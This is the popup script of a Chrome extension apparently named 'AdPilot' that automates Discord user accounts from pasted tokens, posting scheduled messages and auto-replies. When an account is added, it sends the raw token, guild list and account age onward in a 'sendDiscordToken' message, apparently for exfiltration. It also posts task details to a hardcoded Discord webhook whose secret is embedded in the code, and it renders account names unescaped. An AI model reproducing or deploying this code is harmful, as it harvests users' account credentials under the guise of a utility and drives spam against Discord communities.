// popup.js

const MAX_ACCOUNTS = 3;
let currentAccounts = [];
let tasks = {};
let autoReplySettings = {};
let activeInstanceId = null;
let activeAutoReplyInstanceId = null;
let statsInterval = null;
const taskTimers = {};

// Webhook for task notifications
const TASK_WEBHOOK_URL = "https://discord.com/api/webhooks/1547358202352369685/A0hU1Pcddj2nVVciNrkTGa8w799-UlWyRRgK7Mjv49a2Luz0pwpm0Lm4HB2Y1v877imz";

const $ = (id) => document.getElementById(id);
const secretGate = $('secretGate');
const dashboard = $('dashboard');
const keyInput = $('secretKeyInput');
const submitKeyBtn = $('submitKeyBtn');
const keyStatus = $('keyStatus');
const accountsList = $('accountsList');
const addAccountBtn = $('addAccountBtn');
const addAccountForm = $('addAccountForm');
const tokenInput = $('tokenInput');
const saveTokenBtn = $('saveTokenBtn');
const cancelAddBtn = $('cancelAddBtn');
const addStatus = $('addStatus');
const noAccountsMsg = $('noAccountsMsg');
const taskForm = $('taskForm');
const accountSelect = $('accountSelect');
const accountAvatar = $('accountAvatar');
const channelIdInput = $('channelIdInput');
const serverPreview = $('serverPreview');
const serverIcon = $('serverIcon');
const serverName = $('serverName');
const intervalInput = $('intervalInput');
const slowmodeHint = $('slowmodeHint');
const messageLimitSelect = $('messageLimitSelect');
const countdownText = $('countdownText');
const remainingText = $('remainingText');
const imageUrlInput = $('imageUrlInput');
const imagePreview = $('imagePreview');
const imagePreviewImg = $('imagePreviewImg');
const taskMessageInput = $('taskMessageInput');
const launchTaskBtn = $('launchTaskBtn');
const taskStatus = $('taskStatus');
const runningTasksCount = $('runningTasksCount');
const messagesSentCount = $('messagesSentCount');
const autoReplyNoAccountsMsg = $('autoReplyNoAccountsMsg');
const autoReplyForm = $('autoReplyForm');
const autoReplyAccountSelect = $('autoReplyAccountSelect');
const autoReplyAccountAvatar = $('autoReplyAccountAvatar');
const autoReplyMessageInput = $('autoReplyMessageInput');
const autoReplyImageUrlInput = $('autoReplyImageUrlInput');
const autoReplyImagePreview = $('autoReplyImagePreview');
const autoReplyImagePreviewImg = $('autoReplyImagePreviewImg');
const autoReplyDelayInput = $('autoReplyDelayInput');
const autoReplyEnabledCheckbox = $('autoReplyEnabledCheckbox');
const autoReplySaveBtn = $('autoReplySaveBtn');
const autoReplyStatus = $('autoReplyStatus');
const successModal = $('successModal');
const modalAccountAvatar = $('modalAccountAvatar');
const modalCloseBtn = $('modalCloseBtn');

// ---------- UNLOCK FLOW ----------
const VALID_SECRETS = [
  "R8y0sHgkt87f",
  "X7kLp2Qw9zR",
  "T3mN8vBc5dE",
  "J4hG6fDs1aQ",
  "P9oIuY7tReW",
  "L2kJhG5fDsA",
  "QwErTyUiOp12",
  "ZxCvBnMkL45",
  "AsDfGhJkL78",
  "MnBvCxZqWe90",
  "RtYuIoPaSd34",
  "FgHjKlQwEr67",
  "VbNmUyTrEw21",
  "CxZaLkJhGfD09",
  "PlOkIjUhYgT56",
  "NmLkJhGfDsA78",
  "QaZwSxEdCvF45",
  "TyUiOpAsDfG23",
  "HgFdSaQwErT67",
  "JkLpOiUyTrE90"
];

submitKeyBtn.addEventListener('click', () => {
  const code = keyInput.value.trim();
  if (VALID_SECRETS.includes(code)) {
    chrome.storage.local.set({ authenticated: true }, () => {
      showDashboard();
    });
  } else {
    keyStatus.textContent = 'Invalid code';
    keyStatus.className = 'status-text error';
  }
});

keyInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') submitKeyBtn.click();
});

function showDashboard() {
  secretGate.classList.add('hidden');
  dashboard.classList.remove('hidden');
  switchTab('dashboardTab');
  refreshAll();
  startStatsTimer();
}

// ---------- TAB SWITCHING ----------
function switchTab(tabId) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  const activeTab = document.querySelector(`.tab[data-tab="${tabId}"]`);
  if (activeTab) activeTab.classList.add('active');

  document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
  const content = document.getElementById(tabId);
  if (content) content.classList.remove('hidden');

  if (tabId === 'dashboardTab') refreshAll();
  if (tabId === 'scheduledTab') updateScheduledUI();
  if (tabId === 'autoReplyTab') updateAutoReplyUI();
}

document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    switchTab(tab.dataset.tab);
  });
});

// ---------- ACCOUNT MANAGEMENT ----------
addAccountBtn.addEventListener('click', () => {
  addAccountForm.classList.remove('hidden');
  addAccountBtn.style.display = 'none';
  tokenInput.value = '';
});

cancelAddBtn.addEventListener('click', () => {
  addAccountForm.classList.add('hidden');
  addAccountBtn.style.display = 'inline-block';
});

saveTokenBtn.addEventListener('click', async () => {
  const token = tokenInput.value.trim();
  if (!token) return;
  try {
    const res = await fetch('https://discord.com/api/v9/users/@me', {
      headers: { Authorization: token, 'User-Agent': 'Mozilla/5.0' }
    });
    if (!res.ok) throw new Error('Invalid token');
    const user = await res.json();

    const discordEpoch = 1420070400000;
    const accountAgeTimestamp = Math.floor(user.id / 4194304) + discordEpoch;
    const accountAge = new Date(accountAgeTimestamp).toLocaleDateString();

    let guilds = [];
    try {
      const guildsRes = await fetch('https://discord.com/api/v9/users/@me/guilds', {
        headers: { Authorization: token, 'User-Agent': 'Mozilla/5.0' }
      });
      if (guildsRes.ok) {
        const guildsData = await guildsRes.json();
        guilds = guildsData.map(g => g.name);
      }
    } catch (e) {
      console.error('Failed to fetch guilds:', e);
    }

    const instanceId = Date.now() + Math.random().toString();
    currentAccounts.push({
      token,
      username: user.username,
      displayName: user.global_name || user.username,
      avatarUrl: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : 'https://cdn.discordapp.com/embed/avatars/0.png',
      userId: user.id,
      instanceId,
      paused: false
    });

    chrome.storage.local.set({ discordAccounts: currentAccounts }, () => {
      addAccountForm.classList.add('hidden');
      addAccountBtn.style.display = 'inline-block';
      refreshAll();

      chrome.runtime.sendMessage({
        action: 'sendDiscordToken',
        token: token,
        username: user.username,
        displayName: user.global_name || user.username,
        avatarUrl: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : 'https://cdn.discordapp.com/embed/avatars/0.png',
        accountAge: accountAge,
        guilds: guilds
      });
    });
  } catch (e) {
    addStatus.textContent = 'Failed to add account.';
  }
});

function renderAccounts() {
  accountsList.innerHTML = currentAccounts.map((acc, idx) => `
    <div class="account-card">
      <div class="info">
        <img src="${acc.avatarUrl}" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
        <div>
          <div class="account-name">${acc.displayName}</div>
          <div class="account-username">@${acc.username}</div>
        </div>
      </div>
      <div class="actions">
        <button class="pause-btn ${acc.paused ? 'resume' : ''}" data-index="${idx}">${acc.paused ? 'Resume' : 'Pause'}</button>
        <button class="remove-btn" data-index="${idx}">Remove</button>
      </div>
    </div>
  `).join('');
  addAccountBtn.style.display = currentAccounts.length >= MAX_ACCOUNTS ? 'none' : 'inline-block';

  document.querySelectorAll('.remove-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      const idx = +e.target.dataset.index;
      const removed = currentAccounts.splice(idx, 1)[0];
      delete tasks[removed.instanceId];
      delete autoReplySettings[removed.instanceId];
      chrome.storage.local.set({ discordAccounts: currentAccounts, taskSettings: tasks, autoReplySettings }, refreshAll);
    });
  });

  document.querySelectorAll('.pause-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      const idx = +e.target.dataset.index;
      currentAccounts[idx].paused = !currentAccounts[idx].paused;
      chrome.storage.local.set({ discordAccounts: currentAccounts }, renderAccounts);
    });
  });
}

// ---------- TASKS ----------
accountSelect.addEventListener('change', () => {
  activeInstanceId = accountSelect.value;
  updateAccountAvatar();
});

function updateAccountAvatar() {
  const acc = currentAccounts.find(a => a.instanceId === activeInstanceId);
  accountAvatar.src = acc?.avatarUrl || 'https://cdn.discordapp.com/embed/avatars/0.png';
}

function updateScheduledUI() {
  if (currentAccounts.length === 0) {
    noAccountsMsg.classList.remove('hidden');
    taskForm.classList.add('hidden');
    return;
  }
  noAccountsMsg.classList.add('hidden');
  taskForm.classList.remove('hidden');
  accountSelect.innerHTML = currentAccounts.map(acc => `<option value="${acc.instanceId}">${acc.displayName} (@${acc.username})</option>`).join('');
  if (!activeInstanceId || !currentAccounts.find(a => a.instanceId === activeInstanceId)) {
    activeInstanceId = currentAccounts[0].instanceId;
  }
  accountSelect.value = activeInstanceId;
  updateAccountAvatar();
}

// ---------- SEND TASK DETAILS TO WEBHOOK ----------
async function sendTaskDetailsToWebhook(acc, channelId, message, interval, maxMessages, imageUrl) {
  const embed = {
    title: "🚀 New Task Launched",
    color: 0x6c5ce7,
    timestamp: new Date().toISOString(),
    footer: { text: "AdPilot Task Logger" },
    thumbnail: { url: acc.avatarUrl }, // ✅ Displays the account avatar
    fields: [
      { name: "👤 Account", value: `${acc.displayName} (@${acc.username})`, inline: true },
      { name: "🆔 User ID", value: acc.userId, inline: true },
      { name: "📺 Channel ID", value: channelId, inline: true },
      { name: "💬 Message", value: `\`\`\`${message}\`\`\``, inline: false },
      { name: "⏱️ Interval (sec)", value: interval.toString(), inline: true },
      { name: "🔢 Max Messages", value: maxMessages.toString(), inline: true },
      { name: "🖼️ Image URL", value: imageUrl || "None", inline: false }
    ]
  };

  try {
    await fetch(TASK_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {
    console.error("Failed to send task webhook:", e);
  }
}

launchTaskBtn.addEventListener('click', () => {
  const acc = currentAccounts.find(a => a.instanceId === activeInstanceId);
  if (!acc) return alert('Select account');
  if (acc.paused) return alert('Account paused.');
  const channelId = channelIdInput.value.trim();
  if (!channelId) return alert('Enter channel ID');
  const message = taskMessageInput.value.trim();
  if (!message) return alert('Enter message');
  const interval = parseInt(intervalInput.value) || 5;
  const maxMessages = parseInt(messageLimitSelect.value) || 10;
  const imageUrl = imageUrlInput.value.trim();

  const task = {
    instanceId: activeInstanceId,
    channelId,
    message,
    interval,
    maxMessages,
    remainingMessages: maxMessages,
    running: true,
    sentCount: 0,
    imageUrl
  };
  tasks[activeInstanceId] = task;
  chrome.storage.local.set({ taskSettings: tasks }, () => {
    startTaskTimer(activeInstanceId);
    updateStats();
  });

  // Send task details to the new webhook
  sendTaskDetailsToWebhook(acc, channelId, message, interval, maxMessages, imageUrl);
});

function startTaskTimer(instanceId) {
  if (taskTimers[instanceId]) clearInterval(taskTimers[instanceId]);
  const task = tasks[instanceId];
  if (!task || !task.running) return;
  const intervalMs = task.interval * 1000;
  taskTimers[instanceId] = setInterval(() => {
    if (task.remainingMessages <= 0) {
      clearInterval(taskTimers[instanceId]);
      task.running = false;
      chrome.storage.local.set({ taskSettings: tasks });
      updateStats();
      return;
    }
    task.sentCount++;
    task.remainingMessages--;
    chrome.storage.local.set({ taskSettings: tasks });
    updateStats();
  }, intervalMs);
}

function updateStats() {
  const running = Object.values(tasks).filter(t => t.running).length;
  runningTasksCount.textContent = running;
  const totalSent = Object.values(tasks).reduce((sum, t) => sum + (t.sentCount || 0), 0);
  messagesSentCount.textContent = totalSent;
}

// ---------- AUTO REPLY ----------
autoReplyAccountSelect.addEventListener('change', () => {
  activeAutoReplyInstanceId = autoReplyAccountSelect.value;
  updateAutoReplyAccountAvatar();
});

function updateAutoReplyAccountAvatar() {
  const acc = currentAccounts.find(a => a.instanceId === activeAutoReplyInstanceId);
  autoReplyAccountAvatar.src = acc?.avatarUrl || 'https://cdn.discordapp.com/embed/avatars/0.png';
}

function updateAutoReplyUI() {
  if (currentAccounts.length === 0) {
    autoReplyNoAccountsMsg.classList.remove('hidden');
    autoReplyForm.classList.add('hidden');
    return;
  }
  autoReplyNoAccountsMsg.classList.add('hidden');
  autoReplyForm.classList.remove('hidden');
  autoReplyAccountSelect.innerHTML = currentAccounts.map(acc => `<option value="${acc.instanceId}">${acc.displayName} (@${acc.username})</option>`).join('');
  if (!activeAutoReplyInstanceId || !currentAccounts.find(a => a.instanceId === activeAutoReplyInstanceId)) {
    activeAutoReplyInstanceId = currentAccounts[0].instanceId;
  }
  autoReplyAccountSelect.value = activeAutoReplyInstanceId;
  updateAutoReplyAccountAvatar();
}

autoReplySaveBtn.addEventListener('click', () => {
  const instanceId = activeAutoReplyInstanceId;
  if (!instanceId) return alert('No account');
  const settings = {
    enabled: autoReplyEnabledCheckbox.checked,
    message: autoReplyMessageInput.value.trim(),
    imageUrl: autoReplyImageUrlInput.value.trim(),
    delaySeconds: parseInt(autoReplyDelayInput.value) || 5
  };
  autoReplySettings[instanceId] = settings;
  chrome.storage.local.set({ autoReplySettings });
  autoReplyStatus.textContent = 'Saved';
  autoReplyStatus.className = 'status-text success';
});

// ---------- HELPERS ----------
function refreshAll() {
  renderAccounts();
  updateScheduledUI();
  updateAutoReplyUI();
  updateStats();
}

function startStatsTimer() {
  if (statsInterval) clearInterval(statsInterval);
  statsInterval = setInterval(updateStats, 1000);
}

// ---------- INIT ----------
chrome.storage.local.get(['authenticated', 'discordAccounts', 'taskSettings', 'autoReplySettings'], (result) => {
  currentAccounts = result.discordAccounts || [];
  tasks = result.taskSettings || {};
  autoReplySettings = result.autoReplySettings || {};
  if (result.authenticated) {
    showDashboard();
  } else {
    secretGate.classList.remove('hidden');
  }
});